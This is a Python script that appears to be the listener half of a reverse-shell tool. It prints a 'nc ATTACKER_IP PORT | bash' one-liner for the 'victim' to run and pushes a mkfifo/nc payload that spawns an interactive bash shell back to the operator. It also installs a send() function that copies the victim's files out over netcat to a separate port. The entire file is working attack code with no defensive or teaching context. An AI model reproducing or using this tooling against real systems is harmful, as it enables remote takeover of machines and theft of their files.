#!/usr/bin/env python3

from core.terminal import banner, get_terminal_size
from core.network  import pick_interface, make_server
from core.shell    import interactive
import socket
import threading
import time
import sys

banner()

ATTACKER_IP = pick_interface()
print(f"  \033[1;36m[*]\033[0m Using IP    : \033[1;33m{ATTACKER_IP}\033[0m")

try:
    PORT = int(input("  \033[1;36m[?]\033[0m Listen port : ").strip())
except ValueError:
    PORT = 4444

SHELL_PORT = PORT + 1
FILE_PORT  = PORT + 2

print(f"  \033[1;36m[*]\033[0m Cmd  port   : {PORT}")
print(f"  \033[1;36m[*]\033[0m Shell port  : {SHELL_PORT}")
print(f"  \033[1;36m[*]\033[0m File  port  : {FILE_PORT}")
print()

shell_sock  = None
shell_ready = threading.Event()

def await_shell():
    global shell_sock
    srv = make_server(SHELL_PORT)
    srv.settimeout(60)
    print(f"  \033[1;36m[*]\033[0m Waiting for shell on port {SHELL_PORT}...")
    try:
        shell_sock, addr = srv.accept()
        print(f"  \033[1;32m[+]\033[0m Shell connected from {addr[0]}:{addr[1]}")
        shell_ready.set()
    except socket.timeout:
        print(f"  \033[1;31m[!]\033[0m Shell timed out on port {SHELL_PORT}")
    finally:
        srv.close()

t = threading.Thread(target=await_shell, daemon=True)
t.start()
time.sleep(0.3)

print(f"  \033[1;36m[*]\033[0m Waiting for victim on port {PORT}...")
print(f"  \033[1;36m[*]\033[0m Run this on victim:")
print()
print(f"      \033[1;31mnc {ATTACKER_IP} {PORT} | bash\033[0m")
print()

cmd_srv = make_server(PORT)
cmd_sock, addr = cmd_srv.accept()
cmd_srv.close()
print(f"  \033[1;32m[+]\033[0m Victim connected from {addr[0]}:{addr[1]}")

rows, cols = get_terminal_size()
send_func  = f"send() {{ cat \"$1\" | nc -w 3 {ATTACKER_IP} {FILE_PORT}; }}"

payload = (
    f"rm -f /tmp/.rs; mkfifo /tmp/.rs; "
    f"cat /tmp/.rs | python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>&1 | nc {ATTACKER_IP} {SHELL_PORT} > /tmp/.rs\n"
)

print(f"  \033[1;36m[*]\033[0m Sending payload...")
try:
    cmd_sock.sendall(payload.encode())
    time.sleep(0.5)
    cmd_sock.close()
except Exception as e:
    print(f"  \033[1;31m[!]\033[0m Failed to send payload: {e}")
    sys.exit(1)

print(f"  \033[1;36m[*]\033[0m Waiting for shell callback (60s)...")
shell_ready.wait(timeout=60)

if not shell_sock:
    print("\n  \033[1;31m[!]\033[0m Shell did not connect back.")
    sys.exit(1)

time.sleep(1.0)

shell_sock.setblocking(False)
deadline = time.time() + 0.5
while time.time() < deadline:
    try:
        shell_sock.recv(4096)
    except:
        break
    time.sleep(0.05)
shell_sock.setblocking(True)

shell_sock.sendall(f"stty rows {rows} cols {cols}\n".encode())
time.sleep(0.3)
shell_sock.sendall(f"export TERM=xterm-256color\n".encode())
time.sleep(0.3)
shell_sock.sendall(f"{send_func}\n".encode())
time.sleep(0.3)
shell_sock.sendall(b"clear\n")
time.sleep(0.5)

print(f"  \033[1;32m[+]\033[0m Shell ready!")
print(f"  \033[1;36m[*]\033[0m Type \033[1;33msend\033[0m to open transfer menu")
print(f"  \033[1;36m[*]\033[0m Type \033[1;33mexit\033[0m or press \033[1;33mCtrl+D\033[0m to end session\n")
time.sleep(0.3)

interactive(shell_sock, ATTACKER_IP, FILE_PORT)
